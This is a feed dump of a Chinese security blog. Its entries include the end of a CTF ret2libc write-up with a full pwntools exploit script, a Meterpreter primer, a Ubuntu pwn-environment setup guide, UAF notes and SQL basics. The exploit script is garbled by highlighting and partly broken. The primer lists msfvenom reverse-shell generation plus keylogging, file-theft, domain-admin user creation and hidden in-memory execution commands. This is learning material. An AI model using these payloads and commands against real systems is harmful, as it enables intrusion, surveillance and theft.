.plt.got中。</p></blockquote><p><strong>思路</strong> </p><p>通过read覆盖返回地址没执行两次main函数，第一次泄露write函数的地址，第二次执行system函数。</p><p>exp:</p><figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">52277</span>)<br> # p=process("./level3")<br> # 获取文件对象<br>elf=ELF(<span class="hljs-string">'./level3'</span>)<br> #获取lib库对象<br>libc=ELF(<span class="hljs-string">'./libc_32.so.6'</span>)<br> #获取函数<br>wirte_plt=elf.plt[<span class="hljs-string">'write'</span>]<br>write_got=elf.got[writ<span class="hljs-string">e']</span><br><span class="hljs-string">main_addr=elf.sym['</span>main<span class="hljs-string">']</span><br><span class="hljs-string"> #接受数据</span><br><span class="hljs-string">p.recvuntil(":\n")</span><br><span class="hljs-string">  #char[88],ebp write函数地址，write函数返回地址（返回到main函数） write函数参数一（1）  write函数参数二（write_got的地址）write参数三（写4字节）</span><br><span class="hljs-string">payload=0x88*'</span>a<span class="hljs-string">'+p32(0xdeadbeef)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)</span><br><span class="hljs-string">p.sendline(payload)</span><br><span class="hljs-string"> #获取wirte在got中的地址</span><br><span class="hljs-string">write_got_addr=u32(p.recv())</span><br><span class="hljs-string">print hex(write_got_addr)</span><br><span class="hljs-string"> # 计算lib库加载基址</span><br><span class="hljs-string">libc_base=write_got_addr-libc.sym['</span>writ<span class="hljs-string">e']</span><br><span class="hljs-string">print hex(libc_base)</span><br><span class="hljs-string"> # 计算system的地址</span><br><span class="hljs-string">system_addr=libc_base+libc.sym['</span><span class="hljs-keyword">system</span><span class="hljs-string">']</span><br><span class="hljs-string">print hex(bin_sh_addr)</span><br><span class="hljs-string"> #计算字符串/bin/sh 的地址。0x15902b为偏移，通过命令：strings -a -t x libc_32.so.6 | grep "/bin/sh"获取</span><br><span class="hljs-string">bin_sh_addr=libc_base+0x15902b</span><br><span class="hljs-string">print hex(bin_sh_addr)</span><br><span class="hljs-string"> #char [88] ebp system system函数的返回地址 system函数的参数(bin_sh_addr)</span><br><span class="hljs-string">payload2=0x88*'</span>a<span class="hljs-string">'+p32(0xdeadbeef)+p32(system_addr)+p32(0x11111111)+p32(bin_sh_addr)</span><br><span class="hljs-string"> #接受数据</span><br><span class="hljs-string">p.recvuntil(":\n")</span><br><span class="hljs-string"> #发送payloas</span><br><span class="hljs-string">p.sendline(payload2)</span><br><span class="hljs-string"> #切换交互模式</span><br><span class="hljs-string">p.interactive()</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这道题对于我来讲好难好难啊，涉及到了很多新的知识。&lt;br&gt;首先checksec&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/05/08/uFc1bxINidnvHVl.png&quot; alt=&quot;17627983-3b321a2edea9a33</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://sinky.top/tags/ctf/"/>
    
    <category term="pwn" scheme="https://sinky.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>初识Meterpreter</title>
    <link href="https://sinky.top/2022/08/09/%E5%88%9D%E8%AF%86Meterpreter/"/>
    <id>https://sinky.top/2022/08/09/%E5%88%9D%E8%AF%86Meterpreter/</id>
    <published>2022-08-09T03:50:57.231Z</published>
    <updated>2022-08-11T14:20:16.285Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是Meterpreter"><a href="#什么是Meterpreter" class="headerlink" title="什么是Meterpreter"></a>什么是Meterpreter</h2><p>metrepreter 是metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道，使用它作为攻击载荷能够获得目标系统的一个meterpreter shell的链接。</p><blockquote><p>meterpreter shell作为渗透模块有很多有用的功能，如：添加用户、隐藏、打开shell、得到用户密码、上传下载远程主机文件、运行cmd、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息 网络接口 ip地址等信息。<br>Meterpreter能够躲避入侵检测系统，在远程主机上隐藏自己，不改变系统硬盘中的文件<br>Meterpreter 是一种后渗透工具，属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型payload，此工具基于内存DLL注入理念实现，通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现。</p></blockquote><h2 id="Meterpreter中常用反弹类型"><a href="#Meterpreter中常用反弹类型" class="headerlink" title="Meterpreter中常用反弹类型"></a>Meterpreter中常用反弹类型</h2><h3 id="1-reverse-tcp"><a href="#1-reverse-tcp" class="headerlink" title="1.reverse_tcp"></a>1.reverse_tcp</h3><p>基于TCP的反向链接反弹shell，使用稳定。</p><ul><li><p>Linux:</p><ul><li>linux下反弹shell木马：</li><li><code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f elf -o shell</code></li><li>目录下生成木马文件isshell，为文件加可执行权限，打开metasploit，使用模块handler设置payload(与生成木马所使用payload一致)</li><li>设置地址和端口，开始监听。</li><li>运行反弹shell木马，成功反弹回shell</li></ul></li><li><p>Windows:</p><ul><li><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的ip] lport=[端口] -f exe -o [要生成的文件名]</code></li><li><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f exe -o shell.exe</code></li></ul></li></ul><h3 id="2-reverse-http"><a href="#2-reverse-http" class="headerlink" title="2.reverse_http"></a>2.reverse_http</h3><p>基于http方式的反向连接，网速慢的情况下不稳定。</p><p><code>payload: /windows/meterpreter/reverse_http</code></p><h3 id="3-reverse-https"><a href="#3-reverse-https" class="headerlink" title="3.reverse_https"></a>3.reverse_https</h3><p>基于https方式的反向连接，网速慢的情况下不稳定，https若反弹没收到数据，可以将监听端口换成443试试。</p><p><code>payload: /windows/meterpreter/reverse_https</code></p><h3 id="4-bind-tcp"><a href="#4-bind-tcp" class="headerlink" title="4.bind_tcp"></a>4.bind_tcp</h3><p>基于TCP的正向连接shell，一般在内网使用，不需要设置LHOST。</p><p><code>msfvenom -p linux/x86/meterpreter/bind_tcp lport=4444 -f elf -o shell</code></p><p>加权运行。</p><h2 id="Meterpreter-常用命令"><a href="#Meterpreter-常用命令" class="headerlink" title="Meterpreter 常用命令"></a>Meterpreter 常用命令</h2><p>###1.基本命令</p><ul><li>help –查看Meterpreter帮助</li><li>background –返回，把meterpreter后台挂起</li><li>bgkill –杀死一个背景 meterpreter 脚本</li><li>bglist –提供所有正在运行的后台脚本的列表</li><li>bgrun –作为一个后台线程运行脚本</li><li>channel –显示活动频道</li><li>sessions -i number  –与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用</li><li>sesssions -k  number  –与会话进行交互</li><li>close –关闭通道</li><li>exit –终止 meterpreter 会话</li><li>quit –终止 meterpreter 会话</li><li>interact id  –切换进一个信道</li><li>run –执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等</li><li>irb –进入 Ruby 脚本模式</li><li>read –从通道读取数据</li><li>write –将数据写入到一个通道</li><li>run和bgrun –前台和后台执行以后它选定的 meterpreter 脚本</li><li>use –加载 meterpreter 的扩展</li><li>load/use –加载模块</li><li>Resource –执行一个已有的rc脚本</li></ul><h3 id="2-文件系统命令"><a href="#2-文件系统命令" class="headerlink" title="2.文件系统命令"></a>2.文件系统命令</h3><ul><li>cat c:\boot.ini –查看文件内容,文件必须存在</li><li>del c:\boot.ini –删除指定的文件</li><li>upload /root/Desktop/netcat.exe c:\  –上传文件到目标机主上，如upload  setup.exe C:\windows\system32\</li><li>download nimeia.txt /root/Desktop/   –下载文件到本机上如：download C:\boot.ini /root/或者download C:\“ProgramFiles”\Tencent\QQ\Users\295******125\Msg2.0.db /root/</li><li>edit c:\boot.ini   –编辑文件</li><li>getlwd –打印本地目录</li><li>getwd –打印工作目录</li><li>lcd –更改本地目录</li><li>ls –列出在当前目录中的文件列表</li><li>lpwd –打印本地目录</li><li>pwd –输出工作目录</li><li>cd c:\  –进入目录文件下</li><li>rm file  –删除文件</li><li>mkdir dier  –在受害者系统上的创建目录</li><li>rmdir –受害者系统上删除目录</li><li>dir –列出目标主机的文件和文件夹信息</li><li>mv –修改目标主机上的文件名</li><li>search -d d:\www -f web.config  –search 文件，如search  -d c:\  -f*.doc</li><li>meterpreter &gt; search -f autoexec.bat   –搜索文件</li><li>meterpreter &gt; search -f sea*.bat c:\xamp\</li><li>enumdesktops      –用户登录数</li><li>下载文件:使用命令“download +file path”,将下载目标机器的相对应权限的任何路径下的文件</li><li>上传文件: upload 命令为上传文件到我们的目标机器</li><li>查看文件: cat filename 在当前目录下查看文件内容，输入命令后便会返回给我们所查看文件的内容。</li><li>切换、查询当前路径: pwd 命令将查询当前在dos命令下的路径，“cd”命令可以改变当前路径</li><li>sysinfo 命令: 显示远程主机的系统信息，显示计算机、系统信息、结构、语言等信息。可以看到远程主机的操作系统是windows XP service pack 2，sp2这个系统有很多漏洞。</li><li>execute命令: 为目标主机上执行一个命令，其中“execute -h”显示帮助信息。-f为执行要运行的命令<ul><li>如果希望隐藏后台执行，加参数-H <code>execute  -H -f notepad.exe</code></li><li>我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上 <code>execute  -H -i -f cmd.exe</code></li><li>在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀  <code>execute  -H -m -d notepad.exe-f  wce.exe -a "-o wce.txt" </code><ul><li>-d 在目标主机执行时显示的进程名称（用以伪装）</li><li>-m 直接从内存中执行</li><li>-o wce.txt 是wce.exe的运行参数</li></ul></li></ul></li><li>idletime命令:为显示目标机器截止到当前无操作命令的时间</li><li>search命令:在目标主机搜索特定的文件。该命令能够通过搜索整个系统或特定的文件夹。使用<code>search –h</code>命令来查看search命令的帮助信息</li><li>edit命令: 调用vi编辑器，对目标主机上的文件修改</li></ul><h3 id="3-网络命令"><a href="#3-网络命令" class="headerlink" title="3.网络命令"></a>3.网络命令</h3><ul><li><p>ipconfig/ifconfig –显示网络接口的关键信息，包括 IP 地址</p></li><li><p>portfwd  add -l 4444 -p 3389 -r 192.168.1.102  –端口转发,本机监听4444,把目标机3389转到本机4444</p></li><li><p>netstat -an | grep“4444”   –查看指定端口开放情况</p></li><li><p>rdesktop -u Administrator -p bk#123 127.0.0.1:4444  –使用rdesktop来连接桌面，-u 用户名 -p 密码</p></li><li><p>rdesktop 127.1.1.0:4444  –需要输入用户名和密码远程连接</p></li><li><p>route –查看或修改受害者路由表</p><ul><li>route add 192.168.1.0 255.255.255.0 1  –添加动态路由</li><li>route print  –路由表输出</li></ul></li><li><p>runget_local_subnets  –目标主机的内网IP段情况</p></li><li><p>Arp       –看ARP缓冲表</p></li><li><p>Getproxy     –获取代理</p></li><li><p>portfwd：网络命令则有列出ip信息(ipconfig),展示修改路由表(route),还有端口转发(portfwd)。</p></li></ul><h3 id="4-键盘监听"><a href="#4-键盘监听" class="headerlink" title="4.键盘监听"></a>4.键盘监听</h3><ul><li>keyscan_start：开启键盘记录功能</li><li>keyscan_dump：显示捕捉到的键盘记录信息</li><li>keyscan_stop：停止键盘记录功能</li><li>uictl enable keyboard/mouse –接管目标主机的键盘和鼠标。</li></ul><h3 id="5-系统命令"><a href="#5-系统命令" class="headerlink" title="5.系统命令"></a>5.系统命令</h3><ul><li>reboot –重新启动受害人的计算机</li><li>reg –与受害人的注册表进行交互</li><li>rev2self  –回到控制目标主机的初始用户账户下</li><li>shell –获得控制台权限</li><li>shutdown –关闭了受害者的计算机</li><li>sysinfo  –查看目标机系统信息，如机器名，操作系统等</li><li>add_user username password -h ip     –在远程目标主机上添加一个用户</li><li>add_group_user “Domain Admins” username -h ip    –将用户添加到目标主机的域管理员组中</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;什么是Meterpreter&quot;&gt;&lt;a href=&quot;#什么是Meterpreter&quot; class=&quot;headerlink&quot; title=&quot;什么是Meterpreter&quot;&gt;&lt;/a&gt;什么是Meterpreter&lt;/h2&gt;&lt;p&gt;metrepreter 是metasploi</summary>
      
    
    
    
    
    <category term="chrome" scheme="https://sinky.top/tags/chrome/"/>
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu16.04重装之各种环境搭建</title>
    <link href="https://sinky.top/2022/08/09/ubuntu%E9%87%8D%E8%A3%85%E4%B9%8B%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://sinky.top/2022/08/09/ubuntu%E9%87%8D%E8%A3%85%E4%B9%8B%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2022-08-09T03:49:00.287Z</published>
    <updated>2022-08-09T03:49:10.368Z</updated>
    
    <content type="html"><![CDATA[<p>环境：ubuntu16.04</p><h1 id="0x00-vmtools解决坑点"><a href="#0x00-vmtools解决坑点" class="headerlink" title="0x00 vmtools解决坑点"></a>0x00 vmtools解决坑点</h1><p>有点无语，笔者踩坑无数，没想到有一天在重装vmtool的时候还能……</p><p>正常安装vmtool后仍旧无法与主机进行复制粘贴，关掉虚拟机查看虚拟机设置。</p><p><img src="https://i.loli.net/2020/10/10/zOQ1jZT5SYip47N.png" alt="捕获.PNG"></p><p><img src="https://i.loli.net/2020/10/10/9pYJxdtsKFEUy4M.png" alt="捕获.PNG"></p><p>建立的共享文件夹要设置属性为共享式。</p><p>搞完之后……就可以了。</p><p>此处贴一个跟我一样的暴躁博主教程：<br><a href="https://blog.csdn.net/zerolity/article/details/81206476">https://blog.csdn.net/zerolity/article/details/81206476</a></p><h1 id="0x01-pwntools安装"><a href="#0x01-pwntools安装" class="headerlink" title="0x01 pwntools安装"></a>0x01 pwntools安装</h1><p>1.安装python2.7和pip</p><p><code>sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential </code></p><p>2.升级pip：<code>sudo pip install --upgrade pip</code></p><p>更改pip的配置文件/usr/bin/pip</p><p>更改为：</p><p><img src="https://i.loli.net/2020/10/10/zGq57OjUeWcxXnM.png" alt="捕获.PNG"></p><p>3.安装pwntools：<code>sudo pip install pwntools</code></p><p>报错超时，换个阿里源就好了。</p><p>3.1 更换阿里源</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo su<br><span class="hljs-built_in">cd</span> /etc/apt <span class="hljs-comment">#切换到apt源文件</span><br><span class="hljs-built_in">mv</span> source.list sources.list_bak <span class="hljs-comment">#备份源文件</span><br>vim sources.list <span class="hljs-comment">#新建一个，直接把下面的内容copy进去</span><br></code></pre></td></tr></tbody></table></figure><p>copy的内容：</p><figure class="highlight plaintext"><figcaption><span>deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricted</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs #">deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-properties<br>deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted<br>deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-properties<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted<br>deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-properties<br>deb http://mirrors.aliyun.com/ubuntu/ xenial universe<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe<br>deb http://mirrors.aliyun.com/ubuntu/ xenial multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse<br>deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-properties<br>deb http://archive.canonical.com/ubuntu xenial partner<br>deb-src http://archive.canonical.com/ubuntu xenial partner<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted<br>deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-properties<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse```<br><br>3.2 保存配置后，更新配置：`sudo apt-get update`<br><br>之后再重新步骤三的安装命令即可。<br><br>4.测试<br><br><br>![捕获.PNG](https://i.loli.net/2020/10/10/7wzfu32HFRiCXap.png)<br><br>无报错，返回了'1\xc0'，成功！<br><br>所以为啥第一次自己去安装pwntools的时候费了很多力气呢，感觉那时候踩坑无数到崩溃……<br><br># 0x02 GDB及三个插件的安装<br>在终端输入gdb，发现ubuntu16自带gdb，那我就直接安装插件得了。<br>* peda:做逆向破解<br>* gef：用于debug最好<br>* gdbinit：简单版<br><br>用git下载插件：<br>`git clone https://github.com/gatieme/GdbPlugins.git ~/GdbPlugins`<br><br>没有git的下载：`apt-get install git`<br><br>在目录GdbPlugin下可以看见三个插件，想用哪个插件就可以在该目录下输入对应命令：<br><br>```echo "source ~/GdbPlugins/peda/peda.py" &gt; ~/.gdbinit <br>echo "source ~/GdbPlugins/gef/gef.py" &gt; ~/.gdbinit <br>echo "source ~/GdbPlugins/gdbinit/gdbinit" &gt; ~/.gdbinit  <br></code></pre></td></tr></tbody></table></figure><h1 id="0x03-安装checksec"><a href="#0x03-安装checksec" class="headerlink" title="0x03 安装checksec"></a>0x03 安装checksec</h1><figure class="highlight plaintext"><figcaption><span>clone</span><a href="https://github.com/slimm609/checksec.sh.git">link</a></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs git">cd checksec.sh<br></code></pre></td></tr></tbody></table></figure><p>目录下的checksec本来想建立一个软链接过去/usr/local/bin里，但是一直打不开，于是直接用cp命令把checksec拷贝过去了。在/usr/local/bin能够打开checksec，才算成功。</p><h1 id="0x04-安装docker-pikachu靶场"><a href="#0x04-安装docker-pikachu靶场" class="headerlink" title="0x04 安装docker+pikachu靶场"></a>0x04 安装docker+pikachu靶场</h1><h4 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h4><ul><li>先卸载可能存在的旧版本： <code>$ sudo apt-get remove docker docker-engine docker-ce docker.io</code></li><li>更新apt包索引: <code>$ sudo apt-get update</code></li><li>安装以下包以使apt可以通过HTTPS使用存储库（repository）: <code>$ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</code></li><li>添加Docker官方的GPG密钥： <code>$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code></li><li>使用下面的命令来设置stable存储库： <code>$ sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</code></li><li>再更新一下apt包索引: <code>$ sudo apt-get update</code></li><li>安装最新版本的Docker CE：<code>$ sudo apt-get install -y docker-ce</code></li><li>查看docker服务是否启动： <code>$ systemctl status docker</code></li><li>若未启动，则启动docker服务: <code>$ sudo systemctl start docker</code></li><li>经典的hello world： <code>$ sudo docker run hello-world</code></li></ul><p><img src="https://i.loli.net/2020/10/13/kofhug8n2VNj1bx.png" alt="捕获.PNG"></p><p>如图输出则表示docker安装成功。</p><h4 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;环境：ubuntu16.04&lt;/p&gt;
&lt;h1 id=&quot;0x00-vmtools解决坑点&quot;&gt;&lt;a href=&quot;#0x00-vmtools解决坑点&quot; class=&quot;headerlink&quot; title=&quot;0x00 vmtools解决坑点&quot;&gt;&lt;/a&gt;0x00 vmtools解决坑点</summary>
      
    
    
    
    
    <category term="环境搭建" scheme="https://sinky.top/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>UAF漏洞简单学习</title>
    <link href="https://sinky.top/2022/08/09/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
    <id>https://sinky.top/2022/08/09/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-08-09T03:48:28.169Z</published>
    <updated>2022-08-09T03:47:46.734Z</updated>
    
    <content type="html"><![CDATA[<p>UAF漏洞是一种内存破坏漏洞，通常存在于浏览器中。</p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>uaf漏洞成因：一块堆内存被释放之后又被使用。<br>再一次被使用是指：指针存在（悬垂指针被引用）引用结果不可预测。</p><p>由于大多数堆内存都是C++对象，所以利用的核心思路即：分配堆去占坑，占的坑中又自己构造的虚表。</p><h2 id="分析方式"><a href="#分析方式" class="headerlink" title="分析方式"></a>分析方式</h2><p>分析uaf漏洞的要点在于弄清楚对象是在哪里被分配，被释放，被重用。</p><p>uaf异常触发点：对已释放的对象进行操作导致的异常，所以异常点即重用点。</p><p>而由于是对对象的操作，可以列出这个对象的所有方法，找出分配和释放的方法，对其下断来分析uaf过程。</p><blockquote><p>1.悬垂指针：指一类不指向任何合法的或者有效的（即与指针的含义不符）的对象的指针，比如一个对象的指针，如果这个对象已经被释放或者回收，但是指针没有进行任何的修改，仍然执行已被释放的内存，这个指针就叫做悬垂指针。</p><p>2.UAF漏洞：Use-AFTER-Free是一种内存破坏漏洞，简单来说，漏洞的原因是使用了悬垂指针。</p></blockquote><p>常见与UAF漏洞配合使用的是堆喷射，分配大量内存，增大靶子的面积，使eip跳进分配的内存中，而分配的内存中又充满了滑板指令，只要命中了滑板指令就可以命中shellcode</p><h2 id="调试方式"><a href="#调试方式" class="headerlink" title="调试方式"></a>调试方式</h2><p>对于uaf漏洞，调试器捕获到的异常并不是漏洞发生的第一现场，所以一般要使用gflags开启PageHeap和UST（windbg自带gflags工具）</p><p><code>gflags.exe /i 程序名.exe +hpa +ust</code></p><p>这样调试器会定位到最先出错的位置。</p><blockquote><p>技巧：<br>1.在ida中查找函数后，在windbg下断<br>2.打开poc文件后出现crash就是对象被重用，根据crash地址来找到重用的对象起始地址<br>3.对对象起始使用 <code>!heap -p -a 地址</code> 可获得这个对象的分配信息，由回溯还可以知道是什么函数分配的。<br>4.对分配函数下断到达分配现场<br>5.在回溯中，分配函数一般为RtlAllocateHeap的上层，而释放函数一般就是FreeHeap的上层。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;UAF漏洞是一种内存破坏漏洞，通常存在于浏览器中。&lt;/p&gt;
&lt;h2 id=&quot;产生原因&quot;&gt;&lt;a href=&quot;#产生原因&quot; class=&quot;headerlink&quot; title=&quot;产生原因&quot;&gt;&lt;/a&gt;产生原因&lt;/h2&gt;&lt;p&gt;uaf漏洞成因：一块堆内存被释放之后又被使用。&lt;br&gt;再一</summary>
      
    
    
    
    
    <category term="chrome" scheme="https://sinky.top/tags/chrome/"/>
    
  </entry>
  
  <entry>
    <title>SQL学习与整理</title>
    <link href="https://sinky.top/2022/08/09/SQL%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%95%B4%E7%90%86/"/>
    <id>https://sinky.top/2022/08/09/SQL%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%95%B4%E7%90%86/</id>
    <published>2022-08-09T03:47:09.145Z</published>
    <updated>2022-08-09T03:45:51.854Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-SQL简介"><a href="#0x01-SQL简介" class="headerlink" title="0x01 SQL简介"></a>0x01 SQL简介</h2><p>SQL（结构化查询语言）用于访问和操作数据库中的数据的标准数据库编程语言。</p><p>SQL是关系数据库系统的标准语言，是一种ANSI标准的计算机语言。</p><p>要创建一个显示数据库中的数据的网站，需要：</p><ul><li>一个RDBMS数据库程序（MS Access SQL Server MySQL）</li><li>使用服务器端脚本语言（PHP ASP）</li><li>使用SQL来获取所需的数据</li><li>使用HTML/CSS来设置页面的样式</li></ul><h2 id="0x02-SQL-RDBMS概念"><a href="#0x02-SQL-RDBMS概念" class="headerlink" title="0x02 SQL RDBMS概念"></a>0x02 SQL RDBMS概念</h2><p>RDBMS是关系数据库管理系统的缩写，是SQL的基础。</p><h3 id="什么是表"><a href="#什么是表" class="headerlink" title="什么是表"></a>什么是表</h3><p>RDBMS中的数据存储在成为表的数据库对象中，这个表基本上是一个相关数据条目的集合，由许多列和行组成，表是关系数据库中最常见和最简单的数据存储形式。</p><h3 id="什么是字段"><a href="#什么是字段" class="headerlink" title="什么是字段"></a>什么是字段</h3><p>每个表都被分解成更小的实体，成为字段，Customers表中的字段由ID、姓名、年龄、地址和薪资组成。</p><p>字段是表中的列，用于维护有关表中每条记录的特定信息。</p><h3 id="什么是记录或者行数据"><a href="#什么是记录或者行数据" class="headerlink" title="什么是记录或者行数据"></a>什么是记录或者行数据</h3><p>记录也成为数据行，即表中存在的每个单独的条目。</p><p>记录是表中的水平实体。</p><h3 id="什么是列？"><a href="#什么是列？" class="headerlink" title="什么是列？"></a>什么是列？</h3><p>列是表彰的垂直实体，其中包含与表中特定字段关联的所有信息。</p><h3 id="什么是空值"><a href="#什么是空值" class="headerlink" title="什么是空值"></a>什么是空值</h3><p>表中的空值是显示为空的字段中的值，这意味中具有空值的字段是没有值的字段。</p><h3 id="SQL约束"><a href="#SQL约束" class="headerlink" title="SQL约束"></a>SQL约束</h3><p>约束是在表上的数据列上强制执行的规则，用于限制可以进入表中的数据类型，这确保了数据库中数据的准确性和可靠性。<br>约束可以是列级别，也可以是表级别，列级约束仅应用于一列，而表级约束则应用于整个表。</p><ul><li>NOT NULL约束：保列中数据不能有NULL值。</li><li>DEFAULT约束：提供该列数据未指定时所采用的默认值。</li><li>UNIQUE约束：保证列中的所有数据各不相同。</li><li>主键约束：唯一标识数据表中的行/记录</li><li>外键约束：唯一标识其他表中的一条行/记录</li><li>CHECK约束：此约束保证列中的所有值满足某一条件</li><li>索引：用于在数据库中快速创建或检索数据</li></ul><p>约束可以在创建表时规定（通过CREATE TABLE语句）或者在表创建减值后规定（通过ALTER TABLE语句）。</p><h3 id="数据完整性"><a href="#数据完整性" class="headerlink" title="数据完整性"></a>数据完整性</h3><p>每个关系数据库管理系统都存在以下类型的数据完整性：</p><ul><li>实体完整性-表中无重复行</li><li>域完整性-通过限制值的类型，格式或范围来强制执行给定列的有效条目</li><li>引用完整性-不能删除其他记录使用的行。</li><li>用户定义的完整性-强制执行一些不属于实体、域或引用完整性的特定业务规则。</li></ul><h3 id="数据库规范化"><a href="#数据库规范化" class="headerlink" title="数据库规范化"></a>数据库规范化</h3><p>数据库规范化是在数据库中有效的组织数据的过程，这个规范化过程有两个原因：</p><ul><li>消除多余数据</li><li>确保数据依赖关系是有意义的</li></ul><p>规范化指导原则称为范式，范式的目的是组织数据库结构，使其符合第一范式、第二范式和第三范式的规则。</p><h2 id="0x03-SQL语法"><a href="#0x03-SQL语法" class="headerlink" title="0x03 SQL语法"></a>0x03 SQL语法</h2><h3 id="SQL语法规则"><a href="#SQL语法规则" class="headerlink" title="SQL语法规则"></a>SQL语法规则</h3><ul><li>SQL语句总是以关键字开始，如SELECT、INSERT、UPDATE、DELETE、DROP、CREATE.</li><li>SQL语句以分号结尾</li><li>SQL不区分大小写。</li></ul><h3 id="数据库表"><a href="#数据库表" class="headerlink" 